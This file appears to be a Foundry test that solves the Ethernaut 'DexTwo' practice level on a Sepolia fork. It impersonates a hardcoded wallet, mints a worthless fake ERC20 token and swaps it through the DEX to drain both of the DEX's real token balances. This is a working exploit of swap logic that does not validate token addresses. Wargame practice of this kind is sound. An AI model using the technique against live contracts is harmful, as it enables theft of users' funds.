// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/23-DexTwo/DexTwo.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";

contract ContractTest is Test {
    DexTwo level23 =
        DexTwo(payable(0xd77e1132bBc973a1774ecC9B16B2ae9AEFd48223));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));
        vm.label(address(this), "Attacker");
        vm.label(
            address(0xd77e1132bBc973a1774ecC9B16B2ae9AEFd48223),
            "Ethernaut23"
        );
    }

    function testEthernaut23() public {
        address mywallet = 0xd4332cb6371a53B77C5773435aFFFecb957c0939;
        vm.startPrank(mywallet);

        address addr_token1 = level23.token1();
        address addr_token2 = level23.token2();
        level23.approve(address(level23), 500);

        FakeToken faketoken_contract = new FakeToken();
        // create condition allow us to swap out the token1
        faketoken_contract.transfer(address(level23), 100);

        // Approve DEX2 transfer our FAKE token
        faketoken_contract.approve(address(level23), 1000);
        // swap(FAKE, token1, 100)
        level23.swap(address(faketoken_contract), addr_token1, 100);

        // Now DEX2 has 200 FAKE token
        // We need to swap(FAKE, token2, 200)
        level23.swap(address(faketoken_contract), addr_token2, 200);
        printBalance(level23, addr_token1, addr_token2, mywallet);

        assert(
            (level23.balanceOf(addr_token1, address(level23)) == 0) &&
                (level23.balanceOf(addr_token2, address(level23)) == 0)
        );
    }

    function printBalance(
        DexTwo _level23,
        address addr_token1,
        address addr_token2,
        address mywallet
    ) public {
        console.log(
            "MyWallet token 1:",
            _level23.balanceOf(addr_token1, mywallet)
        );
        console.log(
            "MyWallet token 2:",
            _level23.balanceOf(addr_token2, mywallet)
        );
        console.log(
            "Contract token 1:",
            _level23.balanceOf(addr_token1, address(_level23))
        );
        console.log(
            "Contract token 2:",
            _level23.balanceOf(addr_token2, address(_level23))
        );
    }

    receive() external payable {}
}

contract FakeToken is ERC20 {
    constructor() public ERC20("FakeToken", "FAKE") {
        _mint(0xd4332cb6371a53B77C5773435aFFFecb957c0939, 500);
    }
}
